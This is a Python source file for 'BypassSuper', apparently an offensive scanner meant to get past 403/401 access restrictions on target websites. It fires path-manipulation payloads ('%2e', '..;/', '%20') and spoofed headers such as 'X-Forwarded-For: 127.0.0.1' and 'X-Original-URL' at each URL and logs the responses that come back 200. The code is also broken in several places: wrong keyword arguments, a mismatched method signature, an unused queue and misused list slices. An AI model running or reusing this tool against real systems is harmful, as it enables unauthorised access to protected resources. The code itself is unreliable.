#!/usr/bin/python3
# -*- coding: UTF-8 -*-
__author__ = "summersec"

import csv
import threading
import optparse
import sys
import logging
import http.client
from urllib import parse
import argparse
from queue import Queue
import requests

threadList = []


# 继承式多线程
class MyThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        queue = Queue()
        self.q = queue

    # start()方法启动线程将自动调用 run()方法
    def run(self):  # 线程执行体
        # 从队列取出数据，每次一条，多个线程同时取，直到取空
        while not self.q.empty():
            BypassSuper.Req(self.q.get())


class BypassSuper:
    def __init__(self):

        with open(mode="a+", file="result.csv", encoding="utf-8", newline="") as file:
            f_csv = csv.writer(file)
            f_csv.writerow(['PreURL', "lastURL", "respone", "payload"])
            file.close()


    # 请求url
    def Req(self, url):
        # url = url
        # url = "https://ssov2.myoas.com:443/sso/user/login"
        req = requests.get(url=url, verify=False)

        if 400 <= req.status_code <= 500:
            req2 = requests.post(url=url, verify=False)
            if req2.status_code == 200:
                print(req)
                self.SaveResult(Preurl=url, lasturl="post", respone=req2.text, payload="get to post")
            else:
                self.Scan(url)

    # 保存扫描结果
    def SaveResult(self, Preurl, lasturl, respone, payload):

        with open(mode="a+", file="result.csv", encoding="utf-8", newline="") as file:
            f_csv = csv.writer(file)
            f_csv.writerow([Preurl, lasturl, respone, payload])
            file.close()

    # 发起扫描
    def Scan(self, url):
        result = self.UrlParse(url=url)
        LastPath = result[3:4]
        Param = result[5:6]
        Upath = result[1:2]
        UHost = result[2:3]

        PreviousPath = result[4:5]

        payloads = ["%2e" + LastPath, "%2e/" + LastPath, LastPath + "/.", "./" + LastPath + "/./",
                    "%20/" + LastPath, LastPath + "%20/", "%20" + LastPath + "%20/", LastPath + "..;/", LastPath + "?",
                    LastPath + "??"
            , "/" + LastPath + "//", LastPath + "/", LastPath + "/.randomstring", LastPath + ".json"]
        hpayloads1 = ["X-Custom-IP-Authorization",
                      "X-Host",
                      "X-Client-IP",
                      "X-Forwarded-For",
                      "X-Originating-IP",
                      "X-Forwared-Host",
                      "X-Remote-IP",
                      "X-Http-Destinationurl",
                      "Client-IP",
                      "Proxy-Host",
                      "Request-Uri",
                      "X-Forwarded-By",
                      "X-Forwarded",
                      "X-Forwarded-For-Original",
                      "X-Forwarded-Server",
                      "X-Forwarder-For",
                      "X-Forward-For",
                      "Base-Url",
                      "Http-Url",
                      "Proxy-Url",
                      "Redirect",
                      "Real-Ip",
                      "Referer",
                      "Referrer",
                      "Refferer",
                      "Uri",
                      "Url",
                      "X-Http-Host-Override",
                      "X-Original-Remote-Addr",
                      "X-Original-Url",
                      "X-Proxy-Url",
                      "X-Rewrite-Url",
                      "X-Real-Ip",
                      "X-Remote-Addr",
                      "X-Originating-IP"
                      ]

        hpayloads2 = [
            "X-Rewrite-URL",
            "X-Original-URL",
            "Referer",
            "RefererHURl",
            "Url",
            "UrlHURl",
            "Uri",
            "UriHURl",
            "X-Proxy-Url",
            "Http-Url",
            "Proxy-Url",
            "Base-Url",
            "Proxy-Url",
            "RefererRurl"
        ]

        hspayloads1 = [
            "X-Rewrite-URL",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-Path",
            "X-Proxy-Url",
            "Http-Url",
            "Proxy-Url",
            "Base-Url",
            "Proxy-Url",
            "Url",
            "Uri"
        ]

        hspayloads2 = [
            "Uri",
            "Url",
            "Referer"
        ]

        payload1 = "127.0.0.1"
        # 特殊payload
        payload2 = "Content-Length"
        payload3 = "0"
        payload4 = "X-Frame-Options"
        payload5 = "Allow"

        for p in payloads:
            self.ScanOne(url, UHost, PreviousPath=PreviousPath, payload=p)

        for hp in hpayloads1:
            self.ScanTwo(url=url, payload1=hp, payload2=payload1)

        for hp2 in hpayloads2:
            self.ScanTwo(url=url, payload1=hp2, payload2="/" + LastPath)
            self.ScanTwo(url=url, payload1=hp2, payload2="/" + Upath)

        self.ScanTwo(url=url, payload1=payload2, payload2=payload3)
        self.ScanTwo(url=url, payload1=payload4, payload2=payload5)

        for hsp1 in hspayloads1:
            self.ScanThree(url=url, payload1=hsp1, payload2=Upath)

        for hsp2 in hspayloads2:
            self.ScanThree(url=url, payload1=hsp2, payload2=url)



    # 第一种方式payload
    def ScanOne(self, url, Uhost, PreviousPath, payload):
        lastU = Uhost + PreviousPath + payload
        req = requests.get(url=lastU, verify=False, header={

            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

        })

        if req.status_code == 200:
            self.SaveResult(Preurl=url, lasturl=lastU, respone=req.text, payload=payload)

    # 第二种方式payload
    def ScanTwo(self, url, payload1, payload2):

        payload = payload1 + ": " + payload2

        req = requests.get(url=url, verify=False, header={
            payload1: payload2,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

        })
        if req.status_code == 200:
            self.SaveResult(Preurl=url, lasturl=url, respone=req.text, payload=payload)

    # 第三种方式payload
    def ScanThree(self, url, Uhost, payload1, payload2):

        payload = payload1 + ": " + payload2

        req = requests.get(url=Uhost, verify=False, header={
            payload1: payload2,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

        })
        if req.status_code == 200:
            self.SaveResult(Preurl=url, lasturl=Uhost, respone=req.text, payload=payload)

    # 保存扫描日志
    def Log(self):
        logging.basicConfig(level=logging.DEBUG,  # 控制台打印的日志级别
                            filename='log.log',
                            filemode='w'  ##模式，有w和a，w就是写模式，每次都会重新写日志，覆盖之前的日志
                            # a是追加模式，默认如果不写的话，就是追加模式
                            # format=
                            # '%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'
                            # # 日志格式
                            )
        httpclient_logger = logging.getLogger("http.client")
        self.httpclient(httpclient_logger, level=logging.DEBUG)

    # 日志处理
    def httpclient(self, httpclinet_logger, level=logging.DEBUG):

        self.httpclient_logger = httpclinet_logger

        # """Enable HTTPConnection debug logging to the logging framework"""
        def httpclient_log(*args):
            self.httpclient_logger.log(level, " ".join(args))

        # mask the print() built-in in the http.client module to use
        # logging instead
        http.client.print = httpclient_log
        # enable debugging
        http.client.HTTPConnection.debuglevel = 1

    # url解析
    def UrlParse(self, url):
        url = url  # 整个URL
        result = parse.urlparse(url)
        Upath = result.path  # 完整的Path
        Uhost = result.scheme + "://" + result.netloc  # 主机
        LastPath = str(Upath).split('/')[-1]  # 最后一个Path
        PreviousPath = str(Upath).split(LastPath)[0]  # 之前的Path
        Param = result.query  # 参数

        return [url, Upath, Uhost, LastPath, PreviousPath, Param]

    def URLS(self, file, nums):
        self.urlQueue = []
        with open(file=file, mode="r", encoding="utf-8") as u:
            urls = u.readlines()
            u.close()
        for url in urls:
            u = url.strip("\r\n").strip()
            self.urlQueue.put(u)
        self.Threads(nums=nums)

    # 多线程并发请求
    def Threads(self, nums):
        for i in range(nums + 1):
            threadList.append(MyThread(self.urlQueue))
        for t in threadList:
            t.start()
        for l in threadList:
            l.join()

    def main(self):
        print("""
        
                ______                            _____                       
                | ___ \                          /  ___|                      
                | |_/ /_   _ _ __   __ _ ___ ___ \ `--. _   _ _ __   ___ _ __ 
                | ___ \ | | | '_ \ / _` / __/ __| `--. \ | | | '_ \ / _ \ '__|
                | |_/ / |_| | |_) | (_| \__ \__ \/\__/ / |_| | |_) |  __/ |   
                \____/ \__, | .__/ \__,_|___/___/\____/ \__,_| .__/ \___|_|   
                        __/ | |                              | |              
                       |___/|_|                              |_|     
                    author: summersec
                    Github: https://github.com/SummerSec/BypassSuper         
        """)
        parse = optparse.OptionParser()
        parse.add_option('-u', '--url', dest='url', help='Please Enter the Target Site! http://www.baidu.com')
        parse.add_option('-t', '--threads', dest='threads', type=int, default=10, help='Please Enter the Threading Nums!')
        parse.add_option('-f', '--file', dest='file', type=str, help='Targets From File! ')
        (options, args) = parse.parse_args()

        if options.url == None and options.file == None:
            parse.print_help()
            sys.exit(0)
        elif options.url != None:
            url = parse.url
            self.Req(url)
        elif options.file != None:
            file = options.file
            t = parse.threads
            self.URLS(file=file, nums=t)
        else:
            print("something is error!")
            return 0




if __name__ == '__main__':
    BypassSuper().main()
